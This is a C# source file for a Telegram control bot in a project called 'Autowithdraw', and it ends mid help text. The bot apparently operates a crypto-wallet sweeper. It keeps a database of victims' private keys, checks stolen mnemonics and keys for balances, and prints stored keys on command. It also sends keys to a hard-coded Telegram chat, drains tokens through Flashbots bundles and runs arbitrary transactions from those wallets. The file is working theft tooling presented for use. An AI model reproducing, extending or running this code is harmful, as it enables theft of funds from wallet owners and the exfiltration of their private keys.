using Autowithdraw.Global;
using Autowithdraw.Global.Common;
using Autowithdraw.Global.Objects;
using Autowithdraw.Main;
using Autowithdraw.Main.Actions;
using Autowithdraw.Main.Handlers;
using NBitcoin;
using Nethereum.Contracts.Standards.ENS.Registrar.ContractDefinition;
using Nethereum.HdWallet;
using Nethereum.Hex.HexTypes;
using Nethereum.RPC.Eth.DTOs;
using Nethereum.Signer;
using Nethereum.Util;
using Nethereum.Web3;
using Nethereum.Web3.Accounts;
using Org.BouncyCastle.Security;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Numerics;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Polling;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.InputFiles;
using Telegram.Bot.Types.ReplyMarkups;
using Chain = Autowithdraw.Global.Objects.Chain;
using File = System.IO.File;
using Network = Autowithdraw.Global.Network;

namespace Autowithdraw
{
    internal class Telegram
    {
        public ITelegramBotClient Bot;

        public Telegram(string Token)
        {
            Bot = new TelegramBotClient(Token);
            Bot.StartReceiving(
                updateHandler: HandleUpdateAsync,
                pollingErrorHandler: HandlePollingErrorAsync,
                receiverOptions: new ReceiverOptions
                {
                    AllowedUpdates = new[] { UpdateType.Message, UpdateType.CallbackQuery },
                    ThrowPendingUpdates = true
                }
            );
        }

        public async Task HandleUpdateAsync(ITelegramBotClient ___, Update update, CancellationToken __)
        {
            #region Callback

            if (update.CallbackQuery != null)
            {
                long QueryChatID = update.CallbackQuery.Message.Chat.Id;
                try
                {
                    string QueryID = update.CallbackQuery.From.Id.ToString();
                    string QueryData = update.CallbackQuery.Data;
                    if (!Settings.Config.Telegram.Allowed.Contains(QueryID))
                        return;


                 

                    #region Earn

                    else if (QueryData.Contains("💰 Earned"))
                    {
                        await Bot.EditMessageTextAsync(QueryChatID, update.CallbackQuery.Message.MessageId, Earn(), ParseMode.Html, replyMarkup: Keyboard());
                    }

                    #endregion

                    #region Spend

                    else if (QueryData.Contains("💸 Spended"))
                    {
                        await Bot.EditMessageTextAsync(QueryChatID, update.CallbackQuery.Message.MessageId, Spend(), ParseMode.Html, replyMarkup: Keyboard());
                    }

                    #endregion

                    #region Balance

                    else if (QueryData.Contains("💲 Balance"))
                    {
                        await Bot.EditMessageTextAsync(QueryChatID, update.CallbackQuery.Message.MessageId, await Balance(), ParseMode.Html, replyMarkup: Keyboard());
                    }

                    #endregion

                    #region Status

                    else if (QueryData.Contains("⏱ Status"))
                    {
                        await Bot.EditMessageTextAsync(QueryChatID, update.CallbackQuery.Message.MessageId, Status(), ParseMode.Html, replyMarkup: Keyboard());
                    }

                    #endregion

                    #region Stakes

                    else if (QueryData.Contains("🥩 Stakes"))
                    {
                        await Stakes(QueryChatID, update.CallbackQuery.Message.MessageId);
                    }

                    #endregion

                    #region Reload

                    else if (QueryData.Contains("🔄 Reload wallets"))
                    {
                        await Reload(QueryChatID, update.CallbackQuery.Message.MessageId, Bot);
                    }

                    #endregion

                    #region Reboot

                    else if (QueryData.Contains("🔄 Reboot AW"))
                    {
                        await Bot.EditMessageTextAsync(QueryChatID, update.CallbackQuery.Message.MessageId, "✅ Rebooting...", replyMarkup: Keyboard());
                        Environment.Exit(0);
                    }

                    #endregion

                    #region Stop/Start AW

                    else if (QueryData.Contains("AW"))
                    {
                        string result = "✅ AW enabled.";

                        if (!Settings.Config.Other.StoppedAW)
                        {
                            Settings.Config.Other.StoppedAW = true;
                            result = "✅ AW disabled.";
                        }
                        else
                        {
                            Settings.Config.Other.StoppedAW = false;
                        }

                        Settings.Config.Save();

                        await Bot.EditMessageTextAsync(QueryChatID, update.CallbackQuery.Message.MessageId, result, replyMarkup: Keyboard());
                    }

                    #endregion

                    else
                    {
                        string Value = "";
                        string Symbol = "";
                        string ContractAddress = "";
                        string Address = "";
                        int ChainID = 0;

                        foreach (var entity in update.CallbackQuery.Message.Entities)
                        {
                            foreach (int chainID in Settings.Chains.Keys)
                            {
                                try
                                {
                                    Match match = new Regex(@"(https?:\/\/)(" + Settings.Chains[chainID].Link.Replace(".", "\\.") + @"\/token\/)((0x)?[a-f0-9A-F]{40})(\?a=)((0x)?[a-fA-F0-9]{40})", RegexOptions.Multiline).Matches(entity.Url)[0];

                                    Value = match.Value;
                                    ContractAddress = Web3.ToChecksumAddress(match.Groups[3].Value);
                                    Address = Web3.ToChecksumAddress(match.Groups[6].Value);
                                    ChainID = chainID;
                                }
                                catch
                                {
                                    // ignored
                                }
                            }
                        }

                        if (ChainID != 0)
                            Symbol = await new ContractHelper("", ContractAddress, Settings.Chains[ChainID].Web3).Symbol();

                        #region Private Key

                        if (QueryData == "🔑 Private Key")
                        {
                            Match match = new Regex(@"Wallet: ((0x)?[a-f0-9A-F]{40})", RegexOptions.Multiline).Matches(update.CallbackQuery.Message.Text)[0];

                            Address = match.Groups[1].Value;

                            await Settings.BotTransaction.Bot.SendTextMessageAsync(-4094775814, $"<code>{Address}</code> - <code>{Settings.Wallets[Address]}</code>", ParseMode.Html);
                        }

                        #endregion

                        #region Flashbots

                        if (QueryData == "🤫 Flashbots")
                        {
                            await Bot.SendTextMessageAsync(QueryChatID, "✅ Withdrawing...");
                            new Thread(async () => await Flashbots.BSC(Address, ContractAddress)).Start();
                        }

                        #endregion

                        #region Balance

                        if (QueryData == "🔄 Check balance")
                            await Task.Factory.StartNew(() => Parse.Token(ContractAddress, 1, Address, ChainID, Value, fromTelegram: true));

                        #endregion

                        #region Trust

                        if (QueryData.Contains("🔰 Trusted"))
                        {
                            string result = "";
                            if (Settings.Config.Other.TrustedTokens.ContainsKey(ContractAddress))
                            {
                                Settings.Config.Other.TrustedTokens.Remove(ContractAddress);
                                result = $"✅ Removed {Symbol} from trusted";
                            }
                            else
                            {
                                Settings.Config.Other.TrustedTokens.Add(ContractAddress, new TrustedToken
                                {
                                    ChainID = ChainID,
                                    Symbol = Symbol
                                });
                                result = $"✅ Added {Symbol} to trusted";
                            }

                            Settings.Config.Save();
                            await Bot.SendTextMessageAsync(QueryChatID, result);
                        }

                        #endregion

                        #region Scam

                        if (QueryData.Contains("⛔ Scam"))
                        {
                            string result = "";
                            if (Settings.Config.Other.ScamTokens.Contains(ContractAddress))
                            {
                                Settings.Config.Other.ScamTokens.Remove(ContractAddress);
                                result = $"✅ Removed {Symbol} from scam";
                            }
                            else
                            {
                                Settings.Config.Other.ScamTokens.Add(ContractAddress);
                                result = $"✅ Added {Symbol} to scam";
                            }

                            Settings.Config.Save();
                            await Bot.SendTextMessageAsync(QueryChatID, result);
                        }

                        #endregion
                    }
                }
                catch (NullReferenceException)
                {
                    // ignored
                }
                catch (Exception e)
                {
                    if (!e.Message.Contains("message is not modified"))
                    {
                        Logger.Error(e);
                        await Bot.SendTextMessageAsync(QueryChatID, $"❌ Error: {e.Message}");
                    }
                }

                return;
            }

            #endregion

            Message msg = update.Message;

            try
            {
                #region Values

                string command = msg.Text.ToLower();
                User user = msg.From;
                string ChatID = user.Id.ToString();

                if (!Settings.Config.Telegram.Allowed.Contains(ChatID))
                    return;

                string[] data = msg.Text.Split(' ');

                #endregion

                #region /valid

                if (command.StartsWith("/valid"))
                {
                    if (data.Length >= 2)
                    {
                        bool seedphrase = data.Length > 2;

                        string mnemonic = seedphrase ? string.Join(" ", data.Skip(1)) : new NBitcoin.Mnemonic(NBitcoin.Wordlist.English, NBitcoin.WordCount.Twelve).ToString();
                        var wallet = new Wallet(mnemonic, null);

                        for (int i = 0; i <= (!seedphrase ? 0 : 100); i++)
                        {
                            var account = wallet.GetAccount(i);

                            if (!seedphrase)
                                account = new Account(data[1]);

                            string result =
                                $"Address — <code>{account.Address}</code>\nPrivate Key — <code>{account.PrivateKey}</code>\nDepth — {i}\nContains in DB: {(Settings.Wallets.ContainsKey(account.Address) ? "✅" : "❌")}\n\n";

                            bool valid = false;

                            foreach (int ChainID in Settings.Chains.Keys)
                            {
                                Chain chain = Settings.Chains[ChainID];

                                try
                                {
                                    BigInteger Nonce =
                                        await chain.Web3.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                            account.Address, BlockParameter.BlockParameterType.latest);
                                    BigInteger Wei = await chain.Web3.Eth.GetBalance.SendRequestAsync(account.Address);
                                    float Ether = (float)Web3.Convert.FromWei(Wei);
                                    float Price = Pricing.GetPrice(Wei, ChainID);

                                    result +=
                                        $"<a href=\"https://{chain.Link}/address/{account.Address}\">{chain.Name}</a>\n   ┝ Transactions: {Nonce} {(Nonce > 0 ? "✅" : "❌")}\n   ┕ Balance: {Ether} {chain.Token} ({Price}$) {(Wei > 0 ? "✅" : "❌")}\n\n";

                                    if (Nonce > 0 || Wei > 0)
                                    {
                                        valid = true;
                                    }
                                }
                                catch (Exception e)
                                {
                                    //Logger.Error($"{chain.Name} - {e.Message}");
                                    //result += $"{chain.Name}\n   ┝ Transactions: ERROR\n     ┕ Balance: ERROR {chain.Token} (?$)\n\n";
                                }
                            }

                            result += $"Valid: {(valid ? "✅" : "❌")}";

                            if (i == 0 || valid)
                                await Bot.SendTextMessageAsync(msg.Chat.Id, result, ParseMode.Html);
                        }
                    }
                    else
                        await Bot.SendTextMessageAsync(msg.Chat.Id,
                            "❌ Usage: /valid PrivateKey/Mnemonic");
                }

                #endregion

                #region /address

                else if (command.StartsWith("/address"))
                {
                    RandomKey Key = Helper.GenerateKey();

                    await Bot.SendTextMessageAsync(user.Id, $"<code>{Key.Address}</code> - <code>{Key.PrivateKey}</code>", ParseMode.Html);
                }

                #endregion

                #region /withdraw

                else if (command.StartsWith("/withdraw"))
                {
                    if (data.Length == 3)
                    {
                        string Address = Web3.ToChecksumAddress(data[1]);
                        string ContractAddress;
                        if (data[2].Length == 40 || data[2].Length == 42)
                            ContractAddress = Web3.ToChecksumAddress(data[2]);
                        else
                            ContractAddress = Settings.TrustedSymbols[data[2].ToLower()];

                        await Bot.SendTextMessageAsync(msg.Chat.Id, "✅ Withdrawing...");
                        new Thread(async () => await Flashbots.BSC(Address, ContractAddress)).Start();
                    }
                    else
                        await Bot.SendTextMessageAsync(msg.Chat.Id,
                            "❌ Usage: /withdraw Address ContractAddress/Symbol");
                }

                #endregion

                #region /check

                else if (command.StartsWith("/check"))
                {
                    if (data.Length >= 2)
                    {
                        if (data[1].Length == 42)
                        {
                            string Address = Web3.ToChecksumAddress(data[1]);
                            await Task.Factory.StartNew(() => Main.Handlers.Balance.Check(Address));
                            return;
                        }

                        foreach (int ChainID in Settings.Chains.Keys)
                        {
                            MatchCollection matches =
                                new Regex(
                                    @"(https?:\/\/)(" + Settings.Chains[ChainID].Link.Replace(".", "\\.") +
                                    @"\/token\/)((0x)?[a-f0-9A-F]{40})(\?a=)((0x)?[a-fA-F0-9]{40})",
                                    RegexOptions.Multiline).Matches(command.Replace("www.", ""));

                            foreach (Match match in matches)
                            {
                                try
                                {
                                    string ContractAddress = Web3.ToChecksumAddress(match.Groups[3].Value);
                                    string Address = Web3.ToChecksumAddress(match.Groups[6].Value);

                                    Console.WriteLine(Address);

                                    await Task.Factory.StartNew(() => Parse.Token(ContractAddress, 1, Address,
                                        ChainID, match.Value, fromTelegram: true));
                                    Thread.Sleep(8000);
                                }
                                catch(Exception e)
                                {
                                    Logger.Debug(e.ToString());
                                }
                            }
                        }
                    }
                    else
                        await Bot.SendTextMessageAsync(msg.Chat.Id,
                            "❌ Usage: /check https://Explorer/token/Contract?a=Address [...(optional)]");
                }

                #endregion

                #region /scam

                else if (command.StartsWith("/scam"))
                {
                    if (data.Length == 2)
                    {
                        string Address = Web3.ToChecksumAddress(data[1]);
                        string result = "";
                        if (Settings.Config.Other.ScamTokens.Contains(Address))
                        {
                            Settings.Config.Other.ScamTokens.Remove(Address);
                            result = "✅ Removed";
                        }
                        else
                        {
                            Settings.Config.Other.ScamTokens.Add(Address);
                            result = "✅ Added";
                        }

                        Settings.Config.Save();
                        await Bot.SendTextMessageAsync(msg.Chat.Id, result);
                    }
                    else
                        await Bot.SendTextMessageAsync(msg.Chat.Id, "❌ Usage: /scam Address");
                }

                #endregion

                #region /trusted

                else if (command.StartsWith("/trust"))
                {
                    if (data.Length == 3)
                    {
                        int ChainID = int.Parse(data[2]);
                        string ContractAddress = Web3.ToChecksumAddress(data[1]);
                        string result = "";
                        if (Settings.Config.Other.TrustedTokens.ContainsKey(ContractAddress))
                        {
                            Settings.Config.Other.TrustedTokens.Remove(ContractAddress);
                            result = "✅ Removed";
                        }
                        else
                        {
                            Settings.Config.Other.TrustedTokens.Add(ContractAddress, new TrustedToken
                            {
                                ChainID = ChainID,
                                Symbol = await new ContractHelper("0x", ContractAddress, Settings.Chains[ChainID].Web3)
                                    .Symbol()
                            });
                            result = "✅ Added";
                        }

                        Settings.Config.Save();
                        await Bot.SendTextMessageAsync(msg.Chat.Id, result);
                    }
                    else
                        await Bot.SendTextMessageAsync(msg.Chat.Id, "❌ Usage: /trusted Address ChainID");
                }

                #endregion

                #region /transfer

                else if (command.StartsWith("/transfer"))
                {
                    if (data.Length >= 3 || update.Message.ReplyToMessage?.From.Id == 5257805404)
                    {
                        string Address;
                        float Amount;
                        int ChainID = 56;
                        if (update.Message.ReplyToMessage?.From.Id == 5257805404)
                        {
                            data = update.Message.ReplyToMessage.Text.Split(' ');
                            Address = Web3.ToChecksumAddress(data[10]);
                            Amount = float.Parse(data[4]);
                        }
                        else
                        {
                            Address = Web3.ToChecksumAddress(data[1]);
                            Amount = 0.24f;
                            ChainID = int.Parse(data[2]);
                            if (data.Length == 4)
                                Amount = float.Parse(data[3].Replace(',', '.'));
                        }

                        string Link = Settings.Chains[ChainID].Link;
                        Web3 Account = new Web3(new Account(Settings.Chains[ChainID].Contract.PrivateKey, ChainID),
                            Settings.Chains[ChainID].HTTPClient);

                        string txHash = await Account.TransactionManager.SendTransactionAsync(new TransactionInput
                        {
                            From = Settings.Chains[ChainID].Contract.Sponsor,
                            Gas = new HexBigInteger(Settings.Chains[ChainID].DefaultGas),
                            GasPrice = new HexBigInteger(await Pricing.GetGwei(ChainID)),
                            Value = new HexBigInteger(Web3.Convert.ToWei(Pricing.GetEther(Amount, ChainID))),
                            To = Address,
                            Nonce = new HexBigInteger(await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Settings.Chains[ChainID].Contract.Sponsor, BlockParameter.BlockParameterType.latest))
                        });
                        Message reply = await Bot.SendTextMessageAsync(msg.Chat.Id, "✅ Sent", ParseMode.Html);

                        var receipt = await Helper.WaitForTransactionReceipt(txHash, ChainID, true);

                        if (receipt != null && receipt.Succeeded())
                            await Bot.EditMessageTextAsync(msg.Chat.Id, reply.MessageId,
                                $"<a href=\"https://{Link}/tx/{txHash}\">✅ Confirmed</a>", ParseMode.Html);
                        else
                            await Bot.EditMessageTextAsync(msg.Chat.Id, reply.MessageId,
                                $"<a href=\"https://{Link}/tx/{txHash}\">❌ Error</a>", ParseMode.Html);
                    }
                    else
                        await Bot.SendTextMessageAsync(msg.Chat.Id,
                            "❌ Usage: /transfer Address ChainID [Amount$(optional)]");
                }

                #endregion

                #region /status

                else if (command.StartsWith("/status"))
                {
                    await Bot.SendTextMessageAsync(msg.Chat.Id, Status(), ParseMode.Html, replyMarkup: Keyboard());
                }

                #endregion

                #region /balance

                else if (command.StartsWith("/balance"))
                {
                    await Bot.SendTextMessageAsync(msg.Chat.Id, await Balance(), ParseMode.Html, replyMarkup: Keyboard());
                }

                #endregion

                #region /reboot

                else if (command.StartsWith("/reboot"))
                {
                    await Bot.SendTextMessageAsync(msg.Chat.Id, "✅ Rebooting...", replyMarkup: Keyboard());
                    Environment.Exit(0);
                }

                #endregion

                #region /approve

                else if (command.StartsWith("/approve"))
                {
                    if (data.Length == 4)
                    {
                        string Address = Web3.ToChecksumAddress(data[1]);
                        int ChainID = int.Parse(data[3]);
                        string ContractAddress;
                        if (data[2].Length == 40 || data[2].Length == 42)
                            ContractAddress = Web3.ToChecksumAddress(data[2]);
                        else
                            ContractAddress = Settings.TrustedSymbols[data[2].ToLower()];

                        if (!Settings.Wallets.ContainsKey(Address))
                        {
                            await Network.SendTelegram($"{Address} not contains in DB", isTransaction: true);
                            return;
                        }

                        await Task.Factory.StartNew(() => AutoApprove.Starter(Address, ContractAddress, ChainID, true));

                        await Bot.SendTextMessageAsync(msg.Chat.Id, "✅ Approving...");
                    }
                    else if (data.Length == 5 && (data[1].Length == 40 || data[1].Length == 42 && (data[2].Length == 40 || data[2].Length == 42)))
                    {
                        string Address = Web3.ToChecksumAddress(data[1]);
                        string ApproveAddress = Web3.ToChecksumAddress(data[2]);
                        int ChainID = int.Parse(data[4]);
                        string ContractAddress;
                        if (data[3].Length == 40 || data[3].Length == 42)
                            ContractAddress = Web3.ToChecksumAddress(data[2]);
                        else
                            ContractAddress = Settings.TrustedSymbols[data[2].ToLower()];

                        if (!Settings.Wallets.ContainsKey(Address))
                        {
                            await Network.SendTelegram($"{Address} not contains in DB", isTransaction: true);
                            return;
                        }

                        AutoApprove.Approved.Add(ApproveAddress);
                        await Task.Factory.StartNew(() => AutoApprove.Flashbots(Address, ApproveAddress, ContractAddress));

                        await Bot.SendTextMessageAsync(msg.Chat.Id, "✅ Approving...");
                    }
                    else
                        await Bot.SendTextMessageAsync(msg.Chat.Id,
                            "❌ Usage: /approve Address ContractAddress/Symbol ChainID");
                }

                #endregion

                #region /revoke

                else if (command.StartsWith("/revoke"))
                {
                    if (data.Length == 5)
                    {
                        string Address = Web3.ToChecksumAddress(data[1]);
                        string RevokeAddress = Web3.ToChecksumAddress(data[2]);
                        int ChainID = int.Parse(data[4]);
                        string ContractAddress;
                        if (data[3].Length == 40 || data[3].Length == 42)
                            ContractAddress = Web3.ToChecksumAddress(data[3]);
                        else
                            ContractAddress = Settings.TrustedSymbols[data[3].ToLower()];

                        if (!Settings.Wallets.ContainsKey(Address))
                        {
                            await Network.SendTelegram($"{Address} not contains in DB", isTransaction: true);
                            return;
                        }

                        await Task.Factory.StartNew(() =>
                            AutoApprove.Starter(Address, ContractAddress, ChainID, true, RevokeAddress));

                        await Bot.SendTextMessageAsync(msg.Chat.Id, "✅ Revoking...");
                    }
                    else
                        await Bot.SendTextMessageAsync(msg.Chat.Id,
                            "❌ Usage: /revoke Address RevokeAddress ContractAddress/Symbol ChainID");
                }

                #endregion

                #region /keys

                else if (command.StartsWith("/key"))
                {
                    if (data.Length >= 2)
                    {
                        MatchCollection matches = new Regex(@"[a-fA-F0-9]{40}", RegexOptions.Multiline).Matches(msg.Text);

                        string result = "";

                        foreach (Match match in matches)
                        {
                            string Address = Web3.ToChecksumAddress("0x" + match.Value);
                            try
                            {
                                result += $"<code>{Address}</code> - <code>{Settings.Wallets[Address]}</code>\n\n";
                            }
                            catch
                            {
                                result += $"<code>{Address}</code> - <code>Not contains in DB</code>\n\n";
                            }
                        }

                        await Bot.SendTextMessageAsync(msg.Chat.Id, result, ParseMode.Html);
                    }
                    else
                        await Bot.SendTextMessageAsync(msg.Chat.Id,
                            "❌ Usage: /keys Address [...(optional)]");
                }

                #endregion

                #region /sub

                else if (command.StartsWith("/sub"))
                {
                    if (data.Length >= 3)
                    {
                        string table = data[1].ToLower();
                        float sum = float.Parse(data[2]);

                        switch (table)
                        {
                            case "smartgas":
                                Settings.Stats.Day.Earns.SmartGas.Tokens -= sum;
                                Settings.Stats.Month.Earns.SmartGas.Tokens -= sum;
                                Settings.Stats.AllTime.Earns.SmartGas.Tokens -= sum;
                                break;
                            case "flashbots":
                                Settings.Stats.Day.Earns.Flashbots -= sum;
                                Settings.Stats.Month.Earns.Flashbots -= sum;
                                Settings.Stats.AllTime.Earns.Flashbots -= sum;
                                break;
                            case "withdraws":
                                Settings.Stats.Day.Earns.Withdraw.Tokens -= sum;
                                Settings.Stats.Month.Earns.Withdraw.Tokens -= sum;
                                Settings.Stats.AllTime.Earns.Withdraw.Tokens -= sum;
                                break;
                            default:
                                await Bot.SendTextMessageAsync(msg.Chat.Id,
                                    "❌ Usage: /sub smartgas sum$");
                                return;
                        }

                        Settings.Stats.Day.Earns.Total -= sum;
                        Settings.Stats.Month.Earns.Total -= sum;
                        Settings.Stats.AllTime.Earns.Total -= sum;

                        Settings.Stats.Save();

                        await Bot.SendTextMessageAsync(msg.Chat.Id, "✅ Success", ParseMode.Html);
                    }
                    else
                        await Bot.SendTextMessageAsync(msg.Chat.Id,
                            "❌ Usage: /sub smartgas sum$");
                }

                #endregion

                #region /add

                else if (command.StartsWith("/add"))
                {
                    if (data.Length >= 3)
                    {
                        string table = data[1].ToLower();
                        int sum = int.Parse(data[2]);

                        switch (table)
                        {
                            case "smartgas":
                                Settings.Stats.Day.Earns.SmartGas.Tokens += sum;
                                Settings.Stats.Month.Earns.SmartGas.Tokens += sum;
                                Settings.Stats.AllTime.Earns.SmartGas.Tokens += sum;
                                break;
                            case "flashbots":
                                Settings.Stats.Day.Earns.Flashbots += sum;
                                Settings.Stats.Month.Earns.Flashbots += sum;
                                Settings.Stats.AllTime.Earns.Flashbots += sum;
                                break;
                            case "withdraws":
                                Settings.Stats.Day.Earns.Withdraw.Tokens += sum;
                                Settings.Stats.Month.Earns.Withdraw.Tokens += sum;
                                Settings.Stats.AllTime.Earns.Withdraw.Tokens += sum;
                                break;
                            default:
                                await Bot.SendTextMessageAsync(msg.Chat.Id,
                                    "❌ Usage: /add smartgas sum$");
                                return;
                        }

                        Settings.Stats.Day.Earns.Total += sum;
                        Settings.Stats.Month.Earns.Total += sum;
                        Settings.Stats.AllTime.Earns.Total += sum;

                        Settings.Stats.Save();

                        await Bot.SendTextMessageAsync(msg.Chat.Id, "✅ Success", ParseMode.Html);
                    }
                    else
                        await Bot.SendTextMessageAsync(msg.Chat.Id,
                            "❌ Usage: /add smartgas sum$");
                }

                #endregion

                #region /spend

                else if (command.StartsWith("/spend"))
                {
                    await Bot.SendTextMessageAsync(msg.Chat.Id, Spend(), ParseMode.Html, replyMarkup: Keyboard());
                }

                #endregion

                #region /earn

                else if (command.StartsWith("/earn"))
                {
                    await Bot.SendTextMessageAsync(msg.Chat.Id, Earn(),
                        ParseMode.Html, replyMarkup: Keyboard());
                }

                #endregion

                #region /min

                else if (command.StartsWith("/min"))
                {
                    if (data.Length >= 2)
                    {
                        float Minimum = float.Parse(data[1]);

                        Settings.Config.Other.Minimum = Minimum;
                        Settings.Config.Save();

                        await Bot.SendTextMessageAsync(msg.Chat.Id, "✅ Success", ParseMode.Html);
                    }
                    else
                        await Bot.SendTextMessageAsync(msg.Chat.Id,
                            $"❌ Usage: /min sum$\n\nCurrent amount: {Settings.Config.Other.Minimum}$");
                }

                #endregion

                #region /exec

                else if (command.StartsWith("/exec"))
                {
                    if (data.Length >= 3)
                    {
                        string Address = Web3.ToChecksumAddress(data[1]);
                        int ChainID = int.Parse(data[2].Split('\n')[0]);

                        data = command.Split('\n');

                        string[] Transaction1 = data[1].Split(' ');
                        string ContractAddress = Web3.ToChecksumAddress(Transaction1[0]);
                        string Data = Transaction1[2].Split('\n')[0];
                        BigInteger GasLimit = BigInteger.Parse(Transaction1[1]);

                        if (data.Length == 3)
                        {
                            string[] Transaction2 = data[2].Split(' ');
                            string ContractAddress2 = Web3.ToChecksumAddress(Transaction2[0]);
                            string Data2 = Transaction2[2];
                            BigInteger GasLimit2 = BigInteger.Parse(Transaction2[1]);

                            if (ChainID == 56 || ChainID == 1)
                            {
                                await Bot.SendTextMessageAsync(msg.Chat.Id, "✅ Executing...");

                                if (ChainID == 56)
                                    new Thread(async () => await ExecuteTransaction.FlashbotsBSC(Address, ContractAddress, Data, GasLimit, ContractAddress2, Data2, GasLimit2)).Start();
                                else
                                    new Thread(async () => await ExecuteTransaction.FlashbotsETH(Address, ContractAddress, Data, GasLimit, ContractAddress2, Data2, GasLimit2)).Start();
                            }

                            else
                                await Bot.SendTextMessageAsync(msg.Chat.Id,
                                    $"❌ Usage: /exec Address ChainID\nContractAddress GasLimit Input (required)\nContractAddress GasLimit Input (optional)");
                        }
                        else if (data.Length == 2)
                        {
                            await Bot.SendTextMessageAsync(msg.Chat.Id, "✅ Executing...");

                            if (ChainID == 56)
                                new Thread(async () => await ExecuteTransaction.FlashbotsBSC(Address, ContractAddress, Data, GasLimit)).Start();
                            else if (ChainID == 1)
                            {
                                new Thread(async () => await ExecuteTransaction.FlashbotsETH(Address, ContractAddress, Data, GasLimit)).Start();
                                
                            }
                            else
                                new Thread(async () => await ExecuteTransaction.Starter(Address, ContractAddress, Data, ChainID, GasLimit)).Start();
                        }
                        else
                            await Bot.SendTextMessageAsync(msg.Chat.Id,
                                $"❌ Usage: /exec Address ChainID\nContractAddress GasLimit Input (required)\nContractAddress GasLimit Input (optional)");
                    }
                    else
                        await Bot.SendTextMessageAsync(msg.Chat.Id,
                            $"❌ Usage: /exec Address ChainID\nContractAddress GasLimit Input (required)\nContractAddress GasLimit Input (optional)");
                }

                #endregion

                #region /reload

                else if (command.StartsWith("/reload"))
                {
                    await Reload(msg.Chat.Id, Bot: Bot);
                }

                #endregion

                #region /aw

                else if (command.StartsWith("/aw"))
                {
                    await Bot.SendTextMessageAsync(msg.Chat.Id, "⚙️ Choose settings.", replyMarkup: Keyboard());
                }

                #endregion

                #region /publish

                else if (command.StartsWith("/publish"))
                {
                    await Publish();
                    await Bot.SendTextMessageAsync(msg.Chat.Id, "✅ Published.", replyMarkup: Keyboard());
                }

                #endregion

                #region /logs

                else if (command.StartsWith("/logs"))
                {
                    await Bot.SendDocumentAsync(msg.Chat.Id, new InputOnlineFile(new MemoryStream(Encoding.UTF8.GetBytes(string.Concat(Logger.Logs.ToArray().Reverse().ToList().GetRange(0, Logger.Logs.Count < 300 ? Logger.Logs.Count : 300).ToArray().Reverse()))), "Logs.txt"), caption: "Last 300 logs:");
                }

                #endregion

                #region /stakes

                else if (command.StartsWith("/stakes"))
                {
                    await Stakes(msg.Chat.Id);
                }

                #endregion

                #region /stake

                else if (command.StartsWith("/stake"))
                {
                    if (data.Length >= 4)
                    {
                        string Address = Web3.ToChecksumAddress(data[1]);
                        int Days = 0;
                        int Amount = 0;
                        string Name = data[2].ToUpper();

                        if (Name != "SFUND" && Name != "CAKE")
                        {
                            await Bot.SendTextMessageAsync(msg.Chat.Id,
                                $"❌ Usage: /stake Address Name(SFUND, CAKE) Days(OnlySfund 30, 60, 90, 180) AmountCakes(OnlyCake)");
                            return;
                        }

                        if (Name == "CAKE")
                            Amount = int.Parse(data[3]);

                        if (Name == "SFUND")
                            Days = int.Parse(data[3]);

                        var Stakes = JsonSerializer.Deserialize<List<Stakes>>(await File.ReadAllTextAsync("stakes.json"));

                        Stakes.Add(new Stakes
                        {
                            Address = Address,
                            ContractAddress = Name == "SFUND" ? Settings.SfundContracts[Days] : "0x45c54210128a065de780C4B0Df3d16664f7f859e",
                            Name = Name,
                            Amount = Amount
                        });

                        await File.WriteAllTextAsync("./stakes.json", JsonSerializer.Serialize(Stakes,
                            new JsonSerializerOptions
                            {
                                WriteIndented = true
                            }));
                        await Bot.SendTextMessageAsync(msg.Chat.Id, "✅ Success",
                            ParseMode.Html, replyMarkup: Keyboard());
                    }
                    else
                        await Bot.SendTextMessageAsync(msg.Chat.Id,
                            $"❌ Usage:\nSFUND: /stake Address SFUND Days(30, 60, 90, 180)\nCAKE: /stake Address CAKE Amount");
                }

                #endregion

                #region /gwei

                else if (command.StartsWith("/gwei"))
                {
                    if (data.Length == 3)
                    {
                        string Address = Web3.ToChecksumAddress(data[1]);
                        int Gwei = int.Parse(data[2]);

                        var Stakes = JsonSerializer.Deserialize<List<Stakes>>(await File.ReadAllTextAsync("stakes.json"));

                        foreach (var Stake in Stakes)
                        {
                            if (Stake.Address == Address)
                                Stake.Gwei = Gwei;
                        }

                        await File.WriteAllTextAsync("./stakes.json", JsonSerializer.Serialize(Stakes,
                            new JsonSerializerOptions
                            {
                                WriteIndented = true
                            }));
                        await Bot.SendTextMessageAsync(msg.Chat.Id, "✅ Success",
                            ParseMode.Html, replyMarkup: Keyboard());
                    }
                    else
                        await Bot.SendTextMessageAsync(msg.Chat.Id,
                            $"❌ Usage: /gwei Address Gwei");
                }

                #endregion

                #region /help

                else if (command.StartsWith("/help"))
                {
                    await Bot.SendTextMessageAsync(msg.Chat.Id, $"📄 Commands:\n\n" +
                                                                $"Transfer Money (default 0.24$)\n   ┕ <code>/transfer Address ChainID [Amount$(optional)]</code>\n\n" +
                                                                $"Add scam-token\n   ┕ <code>/scam Address</code>\n\n" +
                                                                $"Add trusted-token\n   ┕ <code>/trusted Address ChainID</code>\n\n" +
                                                                $"Withdraw balance (BSC)\n   ┕ <code>/withdraw Address ContractAddress/Symbol</code>\n\n" +
                                                                $"Approve proxy\n   ┕ <code>/approve Address ContractAddress/Symbol ChainID</code>\n\n" +
                                                                $"Revoke address\n   ┕ <code>/revoke Address RevokeAddress ContractAddress/Symbol ChainID</code>\n\n" +
                                                                $"Check balance token\n   ┕ <code>/check https://Explorer/token/Contract?a=Address [...(optional)]</code>\n\n" +
                                                                $"Execute Transaction\n   ┕ <code>/exec Address ChainID\nContractAddress GasLimit Input (required)\nContractAddress GasLimit Input (optional)</code>\n\n" +
                                                                $"Get private keys\n   ┕ <code>/keys Address [...(optional)]</code>\n\n" +
                                                                $"Sub from statistic\n   ┕ <code>/sub smartgas sum$</code>\n\n" +
                                                                $"Add to statistic\n   ┕ <code>/add smartgas sum$</code>\n\n" +
                                                                $"Check of valid\n   ┕ <code>/valid mnemonic/pkey</code>\n\n" +
                                                                $"Get stats of spend AW\n   ┕ <code>/spend</code>\n\n" +
                                                                $"Get stats of earn AW\n   ┕ <code>/earn</code>\n\n" +
